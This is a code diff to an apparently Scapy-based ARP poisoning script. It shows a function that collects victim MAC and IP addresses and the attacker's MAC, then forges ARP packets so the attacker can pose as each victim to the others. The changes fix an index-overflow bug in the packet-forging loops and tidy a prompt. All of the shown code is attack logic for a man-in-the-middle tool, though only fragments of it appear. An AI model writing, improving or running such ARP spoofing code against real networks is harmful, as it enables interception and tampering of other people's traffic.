@@ -47,7 +47,7 @@ def arp_poison():
         # Note: i + 1 is printed to the user of the software
         macVictimList.append(raw_input("The MAC address of the " + str(i+1) + "th victim:"))
         ipVictimList.append(raw_input("The IP address of the " + str(i+1) + "th victim:"))
-    macAttacker = raw_input("The MAC address of the attacker: ")
+    macAttacker = raw_input("The MAC address of the attacker:")
     # ipAttacker = input("The IP address of the attacker: ")
 
     
@@ -59,6 +59,10 @@ def arp_poison():
             # No need to send ARP package to itself.
             if (i==j):
                 j+=1
+            # Since we indent by 1 at every time i == j, at the very last host the attacker can send a message pretending to be someone that is out of the index of ipVictimList.
+            # We must thus break the loop so we do not have an IndexError.
+            if (j>nrOfHosts):
+                break
             arp = Ether() / ARP()
             arp[Ether].src = macAttacker
             arp[ARP].hwsrc = macAttacker
@@ -78,6 +82,10 @@ def arp_poison():
                 # No need to send ARP package to itself.
                 if (i==j):
                     j+=1
+                # Since we indent by 1 at every time i == j, at the very last host the attacker can send a message pretending to be someone that is out of the index of ipVictimList.
+                # We must thus break the loop so we do not have an IndexError.
+                if (j>nrOfHosts):
+                    break
                 arp = Ether() / ARP()
                 arp[Ether].src = macAttacker
                 arp[ARP].hwsrc = macAttacker
